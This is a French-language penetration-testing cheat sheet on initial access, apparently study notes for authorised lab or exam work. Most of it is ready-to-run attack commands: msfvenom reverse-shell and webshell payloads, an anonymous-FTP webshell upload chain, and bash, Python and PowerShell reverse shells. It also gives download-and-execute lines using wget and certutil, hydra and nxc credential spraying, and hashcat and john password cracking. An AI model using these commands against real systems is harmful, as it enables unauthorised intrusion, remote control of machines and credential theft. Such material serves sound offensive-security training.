# Initial Access

## Vecteurs par Fréquence

| Vecteur | Fréquence | Temps | Outils |
| :--- | :---: | :---: | :--- |
| Anonymous SMB/Web Share | 60% | 5–10 min | smbclient, curl |
| WordPress/CMS Vulnerability | 40% | 10–20 min | WPScan, Burp, manual |
| Weak Credentials (Default/Brute-force) | 35% | 5–15 min | Hydra, Medusa |
| Credential in File/Share | 30% | 10–20 min | grep, manual search |
| Unpatched Service (CVE) | 25% | 10–30 min | Exploit-DB, Metasploit |
| LDAP Null Bind | 20% | 5–10 min | ldapsearch, Python |
| SQL Injection | 15% | 15–30 min | SQLMap, manual |

---

## Checklist Initial Access

- [ ] Web app (WordPress, Joomla, custom app)
  - [ ] WPScan pour WordPress
  - [ ] Vérifier /admin, /login, /config
  - [ ] Chercher upload de fichiers
  - [ ] SQL injection, LFI

- [ ] SMB shares
  - [ ] Accès anonyme ?
  - [ ] Default credentials ?
  - [ ] Fichiers backup avec mots de passe ?

- [ ] LDAP
  - [ ] Null bind possible ?
  - [ ] Récupérer la liste d'utilisateurs
  - [ ] Comptes sans pre-auth ?

- [ ] Default credentials
  - [ ] Creds par défaut des applications
  - [ ] Mots de passe de service accounts dans les configs

- [ ] Code/fichiers manuels
  - [ ] Source code dans un dossier .git ?
  - [ ] Credentials hardcodés dans des fichiers
  - [ ] Commentaires dans HTML/PHP

---

## Payloads msfvenom

### Windows

```shell
# EXE x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o rev.exe

# EXE x86
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe

# ASP webshell (IIS)
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f asp > shell.aspx

# DLL malveillante
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o malicious.dll
```

### Linux

```shell
# ELF x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf
chmod +x shell.elf

# ELF x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf
```

### FTP Easy Win (MS FTP → ASP)

```shell
# 1. Créer le shell
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f asp > shell.aspx

# 2. Listener
nc -lvnp 443

# 3. Upload via FTP
ftp $target
# anonymous / anonymous
put shell.aspx
ls   # vérifier

# 4. Déclencher
curl http://$target/shell.aspx
```

---

## Reverse Shells

### Bash

```shell
bash -i >& /dev/tcp/$lhost/$lport 0>&1
```

### PowerShell (base64)

```shell
# Générer sur revshells.com ou encoder manuellement
powershell -e <BASE64_ENCODED_PAYLOAD>
```

### Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Listener Netcat

```shell
nc -lvnp $lport
```

---

## File Transfer

### Windows (depuis Kali)

```powershell
# certutil
certutil -urlcache -split -f http://$lhost/file.exe file.exe

# PowerShell WebClient
powershell (New-Object Net.WebClient).DownloadFile('http://$lhost/file.exe','file.exe')

# curl/wget (PowerShell 5+)
Invoke-WebRequest -Uri http://$lhost/file.exe -OutFile file.exe
```

### Linux (depuis Kali)

```shell
wget http://$lhost/file.sh
curl http://$lhost/file.sh -o file.sh

# Télécharger et exécuter directement
wget http://$lhost/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
```

### Serveur HTTP Kali

```shell
python3 -m http.server 80
# ou
python3 -m http.server 8080
```

---

## Credential Spraying Générique

```shell
# SSH
hydra -L users.txt -P passwords.txt ssh://$target -V -e nsr -f -t 50

# RDP
nxc rdp $target -u users.txt -p passwords.txt --continue-on-success

# SMB
nxc smb $target -u users.txt -p 'Password123' --continue-on-success

# WinRM
nxc winrm $target -u users.txt -p passwords.txt --continue-on-success

# FTP
hydra -L users.txt -p 'FoundPassword' ftp://$target

# HTTP form
hydra -L users.txt -P passwords.txt $target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

> Chaque nouveau user trouvé → ajouter à `users.txt`
> Chaque nouveau mot de passe trouvé → ajouter à `passwords.txt`
> **Spray partout** : FTP, SSH, SMB, WinRM, consoles admin, tout ce qui accepte des credentials

---

## Password Cracking

```shell
# Kerberoast
hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt

# AS-REP Roast
hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt

# ZIP
zip2john file.zip > zip.hash && john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Keychain
keychain2john file.keychain > hash && john hash --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat n'a pas marché ? Essayer John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# John n'a pas marché ? Essayer Crackstation (en ligne)
```
